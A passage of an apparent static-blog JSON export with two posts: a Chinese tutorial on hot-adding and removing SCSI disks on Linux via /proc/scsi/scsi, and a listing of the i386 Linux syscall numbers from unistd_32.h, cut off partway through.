/></p><p>3.用户运行下面命令</p><p>例：echo&nbsp;&quot;scsi&nbsp;add-single-device&nbsp;x&nbsp;y&nbsp;z&nbsp;u&quot;&nbsp;&gt;&nbsp;/proc/scsi/scsi</p><p><img small=\"0\" src=\"/images/pic/f4b4d3743f48b86eb151b968.jpg\" /></p><p>其中：</p><p>　　x是硬盘所在SCSI控制器号(一般机器就一个SCSI控制器，所以就是0);</p><p>　　y是硬盘所在SCSI通道的编号(一般单通道的就是0，多通道的要看是哪个通道了);</p><p>　　z是硬盘的SCSI&nbsp;ID号(可以通过具体插入的硬盘插槽来判断，从0开始);</p><p>　　u是硬盘的lun号(默认情况都是0)</p><p>4.查看文件/proc/scsi/scsi，多出来一个硬盘。fdisk -l 也可以发现多一个硬盘。<br /></p><p><img small=\"0\" src=\"/images/pic/703aeb8c8db0038f503d926a.jpg\" /><br />5.拔下硬盘，别忘了挂载点，运行下面命令。</p><p>echo&nbsp;&quot;scsi remove-single-device&nbsp;x&nbsp;y&nbsp;z&nbsp;u&quot;&nbsp;&gt;&nbsp;/proc/scsi/scsi</p><p></p><p><img small=\"0\" src=\"/images/pic/d636a3fa9a4b6b2c242df277.jpg\" /><br />硬盘被安全移除。<br /><br /></p><p></p>","source":"_posts/linux-scsi硬盘热插拔.md","raw":"title: linux scsi硬盘热插拔\ncategories: [Linux]\ntags: []\ndate: 2011-11-01 10:15:00\n---\n<p>在生产环境中，有很多情况不能随便重启设备，例如scsi硬盘的更换（非raid卡环境）。</p><p>在linux下面修改/proc/scsi/scsi文件可以实现热插拔。</p><p>&nbsp;</p><p>测试环境red hat 5.5+vmware8.0</p><p>具体步骤：</p><p>1.硬盘添加到服务上，看好接口，插槽。</p><p>2.管理员登陆，看一个/proc/scsi/scsi文件</p><p><img small=\"0\" src=\"/images/pic/2a0d2381df82dbd70cf4d283.jpg\" /><br /></p><p>3.用户运行下面命令</p><p>例：echo&nbsp;&quot;scsi&nbsp;add-single-device&nbsp;x&nbsp;y&nbsp;z&nbsp;u&quot;&nbsp;&gt;&nbsp;/proc/scsi/scsi</p><p><img small=\"0\" src=\"/images/pic/f4b4d3743f48b86eb151b968.jpg\" /></p><p>其中：</p><p>　　x是硬盘所在SCSI控制器号(一般机器就一个SCSI控制器，所以就是0);</p><p>　　y是硬盘所在SCSI通道的编号(一般单通道的就是0，多通道的要看是哪个通道了);</p><p>　　z是硬盘的SCSI&nbsp;ID号(可以通过具体插入的硬盘插槽来判断，从0开始);</p><p>　　u是硬盘的lun号(默认情况都是0)</p><p>4.查看文件/proc/scsi/scsi，多出来一个硬盘。fdisk -l 也可以发现多一个硬盘。<br /></p><p><img small=\"0\" src=\"/images/pic/703aeb8c8db0038f503d926a.jpg\" /><br />5.拔下硬盘，别忘了挂载点，运行下面命令。</p><p>echo&nbsp;&quot;scsi remove-single-device&nbsp;x&nbsp;y&nbsp;z&nbsp;u&quot;&nbsp;&gt;&nbsp;/proc/scsi/scsi</p><p></p><p><img small=\"0\" src=\"/images/pic/d636a3fa9a4b6b2c242df277.jpg\" /><br />硬盘被安全移除。<br /><br /></p><p></p>","slug":"linux-scsi硬盘热插拔","published":1,"updated":"2023-04-22T05:38:44.783Z","_id":"clgrjlxfy002y7opih2tke7xg","comments":1,"layout":"post","photos":[],"link":"","content":"<p>在生产环境中，有很多情况不能随便重启设备，例如scsi硬盘的更换（非raid卡环境）。</p><p>在linux下面修改/proc/scsi/scsi文件可以实现热插拔。</p><p>&nbsp;</p><p>测试环境red hat 5.5+vmware8.0</p><p>具体步骤：</p><p>1.硬盘添加到服务上，看好接口，插槽。</p><p>2.管理员登陆，看一个/proc/scsi/scsi文件</p><p><img small=\"0\" src=\"/images/pic/2a0d2381df82dbd70cf4d283.jpg\" /><br /></p><p>3.用户运行下面命令</p><p>例：echo&nbsp;&quot;scsi&nbsp;add-single-device&nbsp;x&nbsp;y&nbsp;z&nbsp;u&quot;&nbsp;&gt;&nbsp;/proc/scsi/scsi</p><p><img small=\"0\" src=\"/images/pic/f4b4d3743f48b86eb151b968.jpg\" /></p><p>其中：</p><p>　　x是硬盘所在SCSI控制器号(一般机器就一个SCSI控制器，所以就是0);</p><p>　　y是硬盘所在SCSI通道的编号(一般单通道的就是0，多通道的要看是哪个通道了);</p><p>　　z是硬盘的SCSI&nbsp;ID号(可以通过具体插入的硬盘插槽来判断，从0开始);</p><p>　　u是硬盘的lun号(默认情况都是0)</p><p>4.查看文件/proc/scsi/scsi，多出来一个硬盘。fdisk -l 也可以发现多一个硬盘。<br /></p><p><img small=\"0\" src=\"/images/pic/703aeb8c8db0038f503d926a.jpg\" /><br />5.拔下硬盘，别忘了挂载点，运行下面命令。</p><p>echo&nbsp;&quot;scsi remove-single-device&nbsp;x&nbsp;y&nbsp;z&nbsp;u&quot;&nbsp;&gt;&nbsp;/proc/scsi/scsi</p><p></p><p><img small=\"0\" src=\"/images/pic/d636a3fa9a4b6b2c242df277.jpg\" /><br />硬盘被安全移除。<br /><br /></p><p></p>","site":{"data":{}},"excerpt":"","more":"<p>在生产环境中，有很多情况不能随便重启设备，例如scsi硬盘的更换（非raid卡环境）。</p><p>在linux下面修改/proc/scsi/scsi文件可以实现热插拔。</p><p>&nbsp;</p><p>测试环境red hat 5.5+vmware8.0</p><p>具体步骤：</p><p>1.硬盘添加到服务上，看好接口，插槽。</p><p>2.管理员登陆，看一个/proc/scsi/scsi文件</p><p><img small=\"0\" src=\"/images/pic/2a0d2381df82dbd70cf4d283.jpg\" /><br /></p><p>3.用户运行下面命令</p><p>例：echo&nbsp;&quot;scsi&nbsp;add-single-device&nbsp;x&nbsp;y&nbsp;z&nbsp;u&quot;&nbsp;&gt;&nbsp;/proc/scsi/scsi</p><p><img small=\"0\" src=\"/images/pic/f4b4d3743f48b86eb151b968.jpg\" /></p><p>其中：</p><p>　　x是硬盘所在SCSI控制器号(一般机器就一个SCSI控制器，所以就是0);</p><p>　　y是硬盘所在SCSI通道的编号(一般单通道的就是0，多通道的要看是哪个通道了);</p><p>　　z是硬盘的SCSI&nbsp;ID号(可以通过具体插入的硬盘插槽来判断，从0开始);</p><p>　　u是硬盘的lun号(默认情况都是0)</p><p>4.查看文件/proc/scsi/scsi，多出来一个硬盘。fdisk -l 也可以发现多一个硬盘。<br /></p><p><img small=\"0\" src=\"/images/pic/703aeb8c8db0038f503d926a.jpg\" /><br />5.拔下硬盘，别忘了挂载点，运行下面命令。</p><p>echo&nbsp;&quot;scsi remove-single-device&nbsp;x&nbsp;y&nbsp;z&nbsp;u&quot;&nbsp;&gt;&nbsp;/proc/scsi/scsi</p><p></p><p><img small=\"0\" src=\"/images/pic/d636a3fa9a4b6b2c242df277.jpg\" /><br />硬盘被安全移除。<br /><br /></p><p></p>"},{"title":"LINUX SYSCALL NUMBER","date":"2013-07-16T13:57:14.000Z","_content":"/usr/include/i386-linux-gnu/asm/unistd.h\n<pre>\n# ifdef __i386__\n#  include <asm/unistd_32.h>\n# else\n#  include <asm/unistd_64.h>\n# endif\n</pre>\n/usr/include/i386-linux-gnu/asm/unistd_32.h\n<pre>\n#ifndef _ASM_X86_UNISTD_32_H\n#define _ASM_X86_UNISTD_32_H\n/*\n * This file contains the system call numbers.\n */\n#define __NR_restart_syscall      0\n#define __NR_exit\t\t  1\n#define __NR_fork\t\t  2\n#define __NR_read\t\t  3\n#define __NR_write\t\t  4\n#define __NR_open\t\t  5\n#define __NR_close\t\t  6\n#define __NR_waitpid\t\t  7\n#define __NR_creat\t\t  8\n#define __NR_link\t\t  9\n#define __NR_unlink\t\t 10\n#define __NR_execve\t\t 11\n#define __NR_chdir\t\t 12\n#define __NR_time\t\t 13\n#define __NR_mknod\t\t 14\n#define __NR_chmod\t\t 15\n#define __NR_lchown\t\t 16\n#define __NR_break\t\t 17\n#define __NR_oldstat\t\t 18\n#define __NR_lseek\t\t 19\n#define __NR_getpid\t\t 20\n#define __NR_mount\t\t 21\n#define __NR_umount\t\t 22\n#define __NR_setuid\t\t 23\n#define __NR_getuid\t\t 24\n#define __NR_stime\t\t 25\n#define __NR_ptrace\t\t 26\n#define __NR_alarm\t\t 27\n#define __NR_oldfstat\t\t 28\n#define __NR_pause\t\t 29\n#define __NR_utime\t\t 30\n#define __NR_stty\t\t 31\n#define __NR_gtty\t\t 32\n#define __NR_access\t\t 33\n#define __NR_nice\t\t 34\n#define __NR_ftime\t\t 35\n#define __NR_sync\t\t 36\n#define __NR_kill\t\t 37\n#define __NR_rename\t\t 38\n#define __NR_mkdir\t\t 39\n#define __NR_rmdir\t\t 40\n#define __NR_dup\t\t 41\n#define __NR_pipe\t\t 42\n#define __NR_times\t\t 43\n#define __NR_prof\t\t 44\n#define __NR_brk\t\t 45\n#define __NR_setgid\t\t 46\n#define __NR_getgid\t\t 47\n#define __NR_signal\t\t 48\n#define __NR_geteuid\t\t 49\n#define __NR_getegid\t\t 50\n#define __NR_acct\t\t 51\n#define __NR_umount2\t\t 52\n#define __NR_lock\t\t 53\n#define __NR_ioctl\t\t 54\n#define __NR_fcntl\t\t 55\n#define __NR_mpx\t\t 56\n#define __NR_setpgid\t\t 57\n#define __NR_ulimit\t\t 58\n#define __NR_oldolduname\t 59\n#define __NR_umask\t\t 60\n#define __NR_chroot\t\t 61\n#define __NR_ustat\t\t 62\n#define __NR_dup2\t\t 63\n#define __NR_getppid\t\t 64\n#define __NR_getpgrp\t\t 65\n#define __NR_setsid\t\t 66\n#define __NR_sigaction\t\t 67\n#define __NR_sgetmask\t\t 68\n#define __NR_ssetmask\t\t 69\n#define __NR_setreuid\t\t 70\n#define __NR_setregid\t\t 71\n#define __NR_sigsuspend\t\t 72\n#define __NR_sigpending\t\t 73\n#define __NR_sethostname\t 74\n#define __NR_setrlimit\t\t 75\n#define __NR_getrlimit\t\t 76   /* Back compatible 2Gig limited rlimit */\n#define __NR_getrusage\t\t 77\n#define __NR_gettimeofday\t 78\n#define __NR_settimeofday\t 79\n#define __NR_getgroups\t\t 80\n#define __NR_setgroups\t\t 81\n#define __NR_select\t\t 82\n#define __NR_symlink\t\t 83\n#define __NR_oldlstat\t\t 84\n#define __NR_readlink\t\t 85\n#define __NR_uselib\t\t 86\n#define __NR_swapon\t\t 87\n#define __NR_reboot\t\t 88\n#define __NR_readdir\t\t 89\n#define __NR_mmap\t\t 90\n#define __NR_munmap\t\t 91\n#define __NR_truncate\t\t 92\n#define __NR_ftruncate\t\t 93\n#define __NR_fchmod\t\t 94\n#define __NR_fchown\t\t 95\n#define __NR_getpriority\t 96\n#define __NR_setpriority\t 97\n#define __NR_profil\t\t 98\n#define __NR_statfs\t\t 99\n#define __NR_fstatfs\t\t100\n#define __NR_ioperm\t\t101\n#define __NR_socketcall\t\t102\n#define __NR_syslog\t\t103\n#define __NR_setitimer\t\t104\n#define __NR_getitimer\t\t105\n#define __NR_stat\t\t106\n#define __NR_lstat\t\t107\n#define __NR_fstat\t\t108\n#define __NR_olduname\t\t109\n#define __NR_iopl\t\t110\n#define __NR_vhangup\t\t111\n#define __NR_idle\t\t112\n#define __NR_vm86old\t\t113\n#define __NR_wait4\t\t114\n#define __NR_swapoff\t\t115\n#define __NR_sysinfo\t\t116\n#define __NR_ipc\t\t117\n#define __NR_fsync\t\t118\n#define __NR_sigreturn\t\t119\n#define __NR_clone\t\t120\n#define __NR_setdomainname\t121\n#define __NR_uname\t\t122\n#define __NR_modify_ldt\t\t123\n#define __NR_adjtimex\t\t124\n#define __NR_mprotect\t\t125\n#define __NR_sigprocmask\t126\n#define __NR_create_module\t127\n#define __NR_init_module\t128\n#define __NR_delete_module\t129\n#define __NR_get_kernel_syms\t130\n#define __NR_quotactl\t\t131\n#define __NR_getpgid\t\t132\n#define __NR_fchdir\t\t133\n#define __NR_bdflush\t\t134\n#define __NR_sysfs\t\t135\n#define __NR_personality\t136\n#define __NR_afs_syscall\t137 /* Syscall for Andrew File System */\n#define __NR_setfsuid\t\t138\n#define __NR_setfsgid\t\t139\n#define __NR__llseek\t\t140\n#define __NR_getdents\t\t141\n#define __NR__newselect\t\t142\n#define __NR_flock\t\t143\n#define __NR_msync\t\t144\n#define __NR_readv\t\t145\n#define __NR_writev\t\t146\n#define __NR_getsid\t\t147\n#define __NR_fdatasync\t\t148\n#define __NR__sysctl\t\t149\n#define __NR_mlock\t\t150\n#define __NR_munlock\t\t151\n#define __NR_mlockall\t\t152\n#define __NR_munlockall\t\t153\n#define __NR_sched_setparam\t\t154\n#define __NR_sched_getparam\t\t155\n#define __NR_sched_setscheduler\t\t156\n#define __NR_sched_getscheduler\t\t157\n#define __NR_sched_yield\t\t158\n#define __NR_sched_get_priority_max\t159\n#define __NR_sched_get_priority_min\t160\n#define __NR_sched_rr_get_interval\t161\n#define __NR_nanosleep\t\t162\n#define __NR_mremap\t\t163\n#define __NR_setresuid\t\t164\n#define __NR_getresuid\t\t165\n#define __NR_vm86\t\t166\n#define __NR_query_module\t167\n#define __NR_poll\t\t168\n#define __NR_nfsservctl\t\t169\n#define __NR_setresgid\t\t170\n#define __NR_getresgid\t\t171\n#define __NR_prctl              172\n#define __NR_rt_sigreturn\t173\n#define __NR_rt_sigaction\t174\n#define __NR_rt_sigprocmask\t175\n#define __NR_rt_sigpending\t176\n#define __NR_rt_sigtimedwait\t177\n#define __NR_rt_sigqueueinfo\t178\n#define __NR_rt_sigsuspend\t179\n#define __NR_pread64\t\t180\n#define __NR_pwrite64\t\t181\n#define __NR_chown\t\t182\n#define __NR_getcwd\t\t183\n#define __NR_capget\t\t184\n#define __NR_capset\t\t185\n#define __NR_sigaltstack\t186\n#define __NR_sendfile\t\t187\n#define __NR_getpmsg\t\t188\t/* some people actually want streams */\n#define __NR_putpmsg\t\t189\t/* some people actually want streams */\n#define __NR_vfork\t\t190\n#define __NR_ugetrlimit\t\t191\t/* SuS compliant getrlimit */\n#define __NR_mmap2\t\t192\n#define __NR_truncate64\t\t193\n#define __NR_ftruncate64\t194\n#define __NR_stat64\t\t195\n#define __NR_lstat64\t\t196\n#define __NR_fstat64\t\t197\n#define __NR_lchown32\t\t198\n#define __NR_getuid32\t\t199\n#define __NR_getgid32\t\t200\n#define __NR_geteuid32\t\t201\n#define __NR_getegid32\t\t202\n#define __NR_setreuid32\t\t203\n#define __NR_setregid32\t\t204\n#define __NR_getgroups32\t205\n#define __NR_setgroups32\t206\n#define __NR_fchown32\t\t207\n#define __NR_setresuid32\t208\n#define __NR_getresuid32\t209\n#define __NR_setresgid32\t210\n#define __NR_getresgid32\t211\n#define __NR_chown32\t\t212\n#define __NR_setuid32\t\t213\n#define __NR_setgid32\t\t214\n#define __NR_setfsuid32\t\t215\n#define __NR_setfsgid32\t\t216\n#define __NR_pivot_root\t\t217\n#define __NR_mincore\t\t218\n#define __NR_madvise\t\t219\n#define __NR_madvise1\t\t219\t/* delete when C lib stub is removed */\n#define __NR_getdents64\t\t220\n#define __NR_fcntl64\t\t221\n/* 223 is unused */\n#define __NR_gettid\t\t224\n#define __NR_readahead\t\t225\n#define __NR_setxattr\t\t226\n#define __NR_lsetxattr\t\t227\n#define __NR_fsetxattr\t\t228\n#define __NR_getxattr\t\t229\n#define __NR_lgetxattr\t\t230\n#define __NR_fgetxattr\t\t231\n#define __NR_listxattr\t\t232\n#define __NR_llistxattr\t\t233\n#define __NR_flistxattr\t\t234\n#define __NR_removexattr\t235\n#define __NR_lremovexattr\t236\n#define __NR_fremovexattr\t237\n#define __NR_tkill\t\t238\n#define __NR_sendfile64\t\t239\n#define __NR_futex\t\t240\n#define __NR_sched_setaffinity\t241\n#define __NR_sched_getaffinity\t242\n#define __NR_set_thread_area\t243\n#define __NR_get_thread_area\t244\n#define __NR_io_setup\t\t245\n#define __NR_io_destroy\t\t246\n#define __NR_io_getevents\t247\n#define __NR_io_submit\t\t248\n#define __NR_io_cancel\t\t249\n#define __NR_fadvise64\t\t250\n/* 251 is available for reuse (was briefly sys_set_zone_reclaim) */\n#define __NR_exit_group\t\t252\n#define __NR_lookup_dcookie\t253\n#define __NR_epoll_create\t254\n#define __NR_epoll_ctl\t\t255\n#define __NR_epoll_wait\t\t256\n#define __NR_remap_file_pages\t257\n#define __NR_set_tid_address\t258\n#define __NR_timer_create\t259\n#define __NR_timer_settime\t(__NR_timer_create+1)\n#define __NR_timer_gettime\t(__NR_timer_create+2)\n#define __NR_timer_getoverrun\t(__NR_timer_create+3)\n#define __NR_timer_delete\t(__NR_timer_create+4)\n#define __NR_clock_settime\t(__NR_timer_create+5)\n#define __NR_clock_gettime\t(__NR_timer_create+6)\n#define __NR_clock_getres\t(__NR_timer_create+7)\n#define __NR_clock_nanosleep\t(__NR_timer_create+8)\n#define __NR_statfs64\t\t268\n#define __NR_fstatfs64\t\t269\n#define __NR_tgkill\t\t270\n#define __NR_utimes\t\t271\n#define __NR_fadvise64_64\t272\n#define __NR_vserver\t\t273\n#define __NR_mbind\t\t274\n#define __NR_get_mempolicy\t275\n#define __NR_set_mempolicy\t276\n#define __NR_mq_open \t\t277\n#define __NR_mq_unlink\t\t(__NR_mq_open+1)\n#define __NR_mq_timedsend\t(__NR_mq_open+2)\n#define __NR_mq_timedreceive\t(__NR_mq_open+3)\n#define __NR_mq_notify\t\t(__NR_mq_open+4)\n#define __NR_mq_getsetattr\t(__NR_mq_open+5)\n#define __NR_kexec_load\t\t283\n#define __NR_waitid\t\t284\n/* #define __NR_sys_setaltroot\t285 */\n#define __NR_add_key\t\t286\n#define __NR_request_key\t287\n#define __NR_keyctl\t\t288\n#define __NR_ioprio_set\t\t289\n#define __NR_ioprio_get\t\t290\n#define __NR_inotify_init\t291\n#define __NR_inotify_add_watch\t292\n#define __NR_inotify_rm_watch\t293\n#define __NR_migrate_pages\t294\n#define __NR_openat\t\t295\n#define __NR_mkdirat\t\t296\n#define __NR_mknodat\t\t297\n#define __NR_fchownat\t\t298\n#define __NR_futimesat\t\t299\n#define __NR_fstatat64\t\t300\n#define __NR_unlinkat\t\t301\n#define __NR_renameat\t\t302\n#define __NR_linkat\t\t303\n#define __NR_symlinkat\t\t304\n#define __NR_readlinkat\t\t305\n#define __NR_fchmodat\t\t306\n#define __NR_faccessat\t\t307\n#define __NR_pselect6\t\t308\n#define __NR_ppoll\t\t309\n#define __NR_unshare\t\t310\n#define __NR_set_robust_list\t311\n#define __NR_get_robust_list\t312\n#define __NR_splice\t\t313\n#define __NR_sync_file_range\t314\n#define __NR_tee\t\t315\n#define __NR_vmsplice\t\t316\n#define __NR_move_pages\t\t317\n#define __NR_getcpu\t\t318\n#define __NR_epoll_pwait\t319\n#define __NR_utimensat\t\t320\n#define __NR_signalfd\t\t321\n#define __NR_timerfd_create\t322\n#define __NR_eventfd\t\t323\n#define __NR_fallocate\t\t324\n#define __NR_timerfd_settime\t325\n#define __NR_timerfd_gettime\t326\n#define __NR_signalfd4\t\t327\n#define __NR_eventfd2\t\t328\n#define __NR_epoll_create1\t329\n#define __NR_dup3\t\t330\n#define __NR_pipe2\t\t331\n#define __NR_inotify_init1\t332\n#define __NR_preadv\t\t333\n#define __NR_pwritev\t\t334\n#define __NR_rt_tgsigqueueinfo\t335\n#define __NR_perf_event_open\t336\n#define __NR_recvmmsg\t\t337\n#define __NR_fanotify_init\t338\n#define __NR_fanotify_mark\t339\n#define __NR_prlimit64\t\t340\n#define __NR_name_to_handle_at\t341\n#define __NR_open_by_handle_at  342\n#define __NR_clock_adjtime\t343\n#define __NR_syncfs             344\n#define __NR_sendmmsg\t\t345\n#define __NR_setns\t\t346\n#define __NR_process_vm_readv\t347\n#define __NR_process_vm_writev\t348\n#endif /* _ASM_X86_UNISTD_32_H */\n</pre>","source":"_posts/LINUX-SYSCALL-NUMBER.md","raw":"title: LINUX SYSCALL NUMBER\ncategories: [程序设计,C编程]\ntags: []\ndate: 2013-07-16 21:57:14\n---\n/usr/include/i386-linux-gnu/asm/unistd.h\n<pre>\n# ifdef __i386__\n#  include <asm/unistd_32.h>\n# else\n#  include <asm/unistd_64.h>\n# endif\n</pre>\n/usr/include/i386-linux-gnu/asm/unistd_32.h\n<pre>\n#ifndef _ASM_X86_UNISTD_32_H\n#define _ASM_X86_UNISTD_32_H\n/*\n * This file contains the system call numbers.\n */\n#define __NR_restart_syscall      0\n#define __NR_exit\t\t  1\n#define __NR_fork\t\t  2\n#define __NR_read\t\t  3\n#define __NR_write\t\t  4\n#define __NR_open\t\t  5\n#define __NR_close\t\t  6\n#define __NR_waitpid\t\t  7\n#define __NR_creat\t\t  8\n#define __NR_link\t\t  9\n#define __NR_unlink\t\t 10\n#define __NR_execve\t\t 11\n#define __NR_chdir\t\t 12\n#define __NR_time\t\t 13\n#define __NR_mknod\t\t 14\n#define __NR_chmod\t\t 15\n#define __NR_lchown\t\t 16\n#define __NR_break\t\t 17\n#define __NR_oldstat\t\t 18\n#define __NR_lseek\t\t 19\n#define __NR_getpid\t\t 20\n#define __NR_mount\t\t 21\n#define __NR_umount\t\t 22\n#define __NR_setuid\t\t 23\n#define __NR_getuid\t\t 24\n#define __NR_stime\t\t 25\n#define __NR_ptrace\t\t 26\n#define __NR_alarm\t\t 27\n#define __NR_oldfstat\t\t 28\n#define __NR_pause\t\t 29\n#define __NR_utime\t\t 30\n#define __NR_stty\t\t 31\n#define __NR_gtty\t\t 32\n#define __NR_access\t\t 33\n#define __NR_nice\t\t 34\n#define __NR_ftime\t\t 35\n#define __NR_sync\t\t 36\n#define __NR_kill\t\t 37\n#define __NR_rename\t\t 38\n#define __NR_mkdir\t\t 39\n#define __NR_rmdir\t\t 40\n#define __NR_dup\t\t 41\n#define __NR_pipe\t\t 42\n#define __NR_times\t\t 43\n#define __NR_prof\t\t 44\n#define __NR_brk\t\t 45\n#define __NR_setgid\t\t 46\n#define __NR_getgid\t\t 47\n#define __NR_signal\t\t 48\n#define __NR_geteuid\t\t 49\n#define __NR_getegid\t\t 50\n#define __NR_acct\t\t 51\n#define __NR_umount2\t\t 52\n#define __NR_lock\t\t 53\n#define __NR_ioctl\t\t 54\n#define __NR_fcntl\t\t 55\n#define __NR_mpx\t\t 56\n#define __NR_setpgid\t\t 57\n#define __NR_ulimit\t\t 58\n#define __NR_oldolduname\t 59\n#define __NR_umask\t\t 60\n#define __NR_chroot\t\t 61\n#define __NR_ustat\t\t 62\n#define __NR_dup2\t\t 63\n#define __NR_getppid\t\t 64\n#define __NR_getpgrp\t\t 65\n#define __NR_setsid\t\t 66\n#define __NR_sigaction\t\t 67\n#define __NR_sgetmask\t\t 68\n#define __NR_ssetmask\t\t 69\n#define __NR_setreuid\t\t 70\n#define __NR_setregid\t\t 71\n#define __NR_sigsuspend\t\t 72\n#define __NR_sigpending\t\t 73\n#define __NR_sethostname\t 74\n#define __NR_setrlimit\t\t 75\n#define __NR_getrlimit\t\t 76   /* Back compatible 2Gig limited rlimit */\n#define __NR_getrusage\t\t 77\n#define __NR_gettimeofday\t 78\n#define __NR_settimeofday\t 79\n#define __NR_getgroups\t\t 80\n#define __NR_setgroups\t\t 81\n#define __NR_select\t\t 82\n#define __NR_symlink\t\t 83\n#define __NR_oldlstat\t\t 84\n#define __NR_readlink\t\t 85\n#define __NR_uselib\t\t 86\n#define __NR_swapon\t\t 87\n#define __NR_reboot\t\t 88\n#define __NR_readdir\t\t 89\n#define __NR_mmap\t\t 90\n#define __NR_munmap\t\t 91\n#define __NR_truncate\t\t 92\n#define __NR_ftruncate\t\t 93\n#define __NR_fchmod\t\t 94\n#define __NR_fchown\t\t 95\n#define __NR_getpriority\t 96\n#define __NR_setpriority\t 97\n#define __NR_profil\t\t 98\n#define __NR_statfs\t\t 99\n#define __NR_fstatfs\t\t100\n#define __NR_ioperm\t\t101\n#define __NR_socketcall\t\t102\n#define __NR_syslog\t\t103\n#define __NR_setitimer\t\t104\n#define __NR_getitimer\t\t105\n#define __NR_stat\t\t106\n#define __NR_lstat\t\t107\n#define __NR_fstat\t\t108\n#define __NR_olduname\t\t109\n#define __NR_iopl\t\t110\n#define __NR_vhangup\t\t111\n#define __NR_idle\t\t112\n#define __NR_vm86old\t\t113\n#define __NR_wait4\t\t114\n#define __NR_swapoff\t\t115\n#define __NR_sysinfo\t\t116\n#define __NR_ipc\t\t117\n#define __NR_fsync\t\t118\n#define __NR_sigreturn\t\t119\n#define __NR_clone\t\t120\n#define __NR_setdomainname\t121\n#define __NR_uname\t\t122\n#define __NR_modify_ldt\t\t123\n#define __NR_adjtimex\t\t124\n#define __NR_mprotect\t\t125\n#define __NR_sigprocmask\t126\n#define __NR_create_module\t127\n#define __NR_init_module\t128\n#define __NR_delete_module\t129\n#define __NR_get_kernel_syms\t130\n#define __NR_quotactl\t\t131\n#define __NR_getpgid\t\t132\n#define __NR_fchdir\t\t133\n#define __NR_bdflush\t\t134\n#define __NR_sysfs\t\t135\n#define __NR_personality\t136\n#define __NR_afs_syscall\t137 /* Syscall for Andrew File System */\n#define __NR_setfsuid\t\t138\n#define __NR_setfsgid\t\t139\n#define __NR__llseek\t\t140\n#define __NR_getdents\t\t141\n#define __NR__newselect\t\t142\n#define __NR_flock\t\t143\n#define __NR_msync\t\t144\n#define __NR_readv\t\t145\n#define __NR_writev\t\t146\n#define __NR_getsid\t\t147\n#define __NR_fdatasync\t\t148\n#define __NR__sysctl\t\t149\n#define __NR_mlock\t\t150\n#define __NR_munlock\t\t151\n#define __NR_mlockall\t\t152\n#define __NR_munlockall\t\t153\n#define __NR_sched_setparam\t\t154\n#define __NR_sched_getparam\t\t155\n#define __NR_sched_setscheduler\t\t156\n#define __NR_sched_getscheduler\t\t157\n#define __NR_sched_yield\t\t158\n#define __NR_sched_get_priority_max\t159\n#define __NR_sched_get_priority_min\t160\n#define __NR_sched_rr_get_interval\t161\n#define __NR_nanosleep\t\t162\n#define __NR_mremap\t\t163\n#define __NR_setresuid\t\t164\n#define __NR_getresuid\t\t165\n#define __NR_vm86\t\t166\n#define __NR_query_module\t167\n#define __NR_poll\t\t168\n#define __NR_nfsservctl\t\t169\n#define __NR_setresgid\t\t170\n#define __NR_getresgid\t\t171\n#define __NR_prctl              172\n#define __NR_rt_sigreturn\t173\n#define __NR_rt_sigaction\t174\n#define __NR_rt_sigprocmask\t175\n#define __NR_rt_sigpending\t176\n#define __NR_rt_sigtimedwait\t177\n#define __NR_rt_sigqueueinfo\t178\n#define __NR_rt_sigsuspend\t179\n#define __NR_pread64\t\t180\n#define __NR_pwrite64\t\t181\n#define __NR_chown\t\t182\n#define __NR_getcwd\t\t183\n#define __NR_capget\t\t184\n#define __NR_capset\t\t185\n#define __NR_sigaltstack\t186\n#define __NR_sendfile\t\t187\n#define __NR_getpmsg\t\t188\t/* some people actually want streams */\n#define __NR_putpmsg\t\t189\t/* some people actually want streams */\n#define __NR_vfork\t\t190\n#define __NR_ugetrlimit\t\t191\t/* SuS compliant getrlimit */\n#define __NR_mmap2\t\t192\n#define __NR_truncate64\t\t193\n#define __NR_ftruncate64\t194\n#define __NR_stat64\t\t195\n#define __NR_lstat64\t\t196\n#define __NR_fstat64\t\t197\n#define __NR_lchown32\t\t198\n#define __NR_getuid32\t\t199\n#define __NR_getgid32\t\t200\n#define __NR_geteuid32\t\t201\n#define __NR_getegid32\t\t202\n#define __NR_setreuid32\t\t203\n#define __NR_setregid32\t\t204\n#define __NR_getgroups32\t205\n#define __NR_setgroups32\t206\n#define __NR_fchown32\t\t207\n#define __NR_setresuid32\t208\n#define __NR_getresuid32\t209\n#define __NR_setresgid32\t210\n#define __NR_getresgid32\t211\n#define __NR_chown32\t\t212\n#define __NR_setuid32\t\t213\n#define __NR_setgid32\t\t214\n#define __NR_setfsuid32\t\t215\n#define __NR_setfsgid32\t\t216\n#define __NR_pivot_root\t\t217\n#define __NR_mincore\t\t218\n#define __NR_madvise\t\t219\n#define __NR_madvise1\t\t219\t/* delete when C lib stub is removed */\n#define __NR_getdents64\t\t220\n#define __NR_fcntl64\t\t221\n/* 223 is unused */\n#define __NR_gettid\t\t224\n#define __NR_readahead\t\t225\n#define __NR_setxattr\t\t226\n#define __NR_lsetxattr\t\t227\n#define __NR_fsetxattr\t\t228\n#define __NR_getxattr\t\t229\n#define __NR_lgetxattr\t\t230\n#define __NR_fgetxattr\t\t231\n#define __NR_listxattr\t\t232\n#define __NR_llistxattr\t\t233\n#define __NR_flistxattr\t\t234\n#define __NR_removexattr\t235\n#define __NR_lremovexattr\t236\n#define __NR_fremovexattr\t237\n#define __NR_tkill\t\t238\n#define __NR_sendfile64\t\t239\n#define __NR_futex\t\t240\n#define __NR_sched_setaffinity\t241\n#define __NR_sched_getaffinity\t242\n#define __NR_set_thread_area\t243\n#define __NR_get_thread_area\t244\n#define __NR_io_setup\t\t245\n#define __NR_io_destroy\t\t246\n#define __NR_io_getevents\t247\n#define __NR_io_submit\t\t248\n#define __NR_io_cancel\t\t249\n#define __NR_fadvise64\t\t250\n/* 251 is available for reuse (was briefly sys_set_zone_reclaim) */\n#define __NR_exit_group\t\t252\n#define __NR_lookup_dcookie\t253\n#define __NR_epoll_create\t254\n#define __NR_epoll_ctl\t\t255\n#define __NR_epoll_wait\t\t256\n#define __NR_remap_file_pages\t257\n#define __NR_set_tid_address\t258\n#define __NR_timer_create\t259\n#define __NR_timer_settime\t(__NR_timer_create+1)\n#define __NR_timer_gettime\t(__NR_timer_create+2)\n#define __NR_timer_getoverrun\t(__NR_timer_create+3)\n#define __NR_timer_delete\t(__NR_timer_create+4)\n#define __NR_clock_settime\t(__NR_timer_create+5)\n#define __NR_clock_gettime\t(__NR_timer_create+6)\n#define __NR_clock_getres\t(__NR_timer_create+7)\n#define __NR_clock_nanosleep\t(__NR_timer_create+8)\n#define __NR_statfs64\t\t268\n#define __NR_fstatfs64\t\t269\n#define __NR_tgkill\t\t270\n#define __NR_utimes\t\t271\n#define 